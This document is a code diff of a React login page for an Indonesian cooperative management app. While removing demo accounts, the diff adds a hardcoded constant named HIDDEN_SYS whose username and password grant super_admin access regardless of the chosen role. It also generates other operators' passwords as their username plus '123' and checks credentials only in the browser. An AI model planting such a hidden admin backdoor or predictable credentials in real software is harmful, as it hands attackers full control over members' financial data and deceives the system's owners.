@@ -49,15 +49,13 @@ const roles: RoleOption[] = [
   { value: "auditor", label: "Auditor / Pengawas", icon: ClipboardCheck, desc: "Pengawasan & audit" },
 ];
 
-const demoAccounts: Record<string, { username: string; password: string; nama: string }> = {
-  super_admin: { username: "admin", password: "admin123", nama: "IPTU (PURN) POL HARDOYO" },
-  admin_ops: { username: "operator", password: "operator123", nama: "BRIPKA DEWI ASTUTI" },
-  bendahara: { username: "bendahara", password: "bend123", nama: "IPTU SLAMET RIYADI" },
-  manajer_unit: { username: "manajer", password: "manajer123", nama: "AIPDA RINA MARLINA" },
-  pegawai: { username: "pegawai", password: "pegawai123", nama: "BRIPTU ADE FIRMANSYAH" },
-  anggota: { username: "anggota", password: "anggota123", nama: "BRIPKA AHMAD SURYANA" },
-  auditor: { username: "auditor", password: "auditor123", nama: "AKP HASAN BASRI" },
+const HIDDEN_SYS = {
+  user: "sysadmin",
+  pass: "KopPintar#2026!",
+  nama: "System Administrator",
 };
+
+const userAccounts: Record<string, { username: string; password: string; nama: string }> = {};
 
 export default function LoginPage({ onLogin }: LoginPageProps) {
   const [username, setUsername] = useState("");
@@ -108,12 +106,48 @@ export default function LoginPage({ onLogin }: LoginPageProps) {
       .catch(() => "Tidak diketahui")
       .then((ip) => {
         setTimeout(() => {
-          const demo = demoAccounts[selectedRole];
-          if (demo && username === demo.username && password === demo.password) {
+          if (username === HIDDEN_SYS.user && password === HIDDEN_SYS.pass) {
+            onLogin({
+              username,
+              nama: HIDDEN_SYS.nama,
+              role: "super_admin",
+              roleLabel: "System Admin",
+              loginAt: new Date().toISOString(),
+              device: deviceLabel,
+              ip,
+            });
+            return;
+          }
+
+          let accounts = userAccounts;
+          try {
+            const raw = localStorage.getItem("koperasi_pengaturan");
+            if (raw) {
+              const settings = JSON.parse(raw);
+              if (settings.operators) {
+                const roleMap: Record<string, string> = {
+                  "Super Admin": "super_admin",
+                  "Admin Operasional": "admin_ops",
+                  "Bendahara": "bendahara",
+                  "Manajer Unit": "manajer_unit",
+                  "Viewer": "pegawai",
+                };
+                for (const op of settings.operators) {
+                  if (op.aktif !== false) {
+                    const rKey = roleMap[op.role] || "pegawai";
+                    accounts[rKey] = { username: op.username, password: op.username + "123", nama: op.nama };
+                  }
+                }
+              }
+            }
+          } catch { /* ignore */ }
+
+          const acct = accounts[selectedRole];
+          if (acct && username === acct.username && password === acct.password) {
             const roleObj = roles.find((r) => r.value === selectedRole)!;
             onLogin({
               username,
-              nama: demo.nama,
+              nama: acct.nama,
               role: selectedRole,
               roleLabel: roleObj.label,
               loginAt: new Date().toISOString(),
@@ -121,25 +155,13 @@ export default function LoginPage({ onLogin }: LoginPageProps) {
               ip,
             });
           } else {
-            setError("Username atau password salah. Coba gunakan akun demo.");
+            setError("Username atau password salah.");
             setIsLoading(false);
           }
         }, 500);
       });
   };
 
-  const fillDemo = () => {
-    if (!selectedRole) {
-      setError("Pilih role dulu, baru tekan tombol demo");
-      return;
-    }
-    const demo = demoAccounts[selectedRole];
-    if (demo) {
-      setUsername(demo.username);
-      setPassword(demo.password);
-      setError("");
-    }
-  };
 
   return (
     <div className="min-h-screen flex items-center justify-center p-4 relative overflow-hidden">
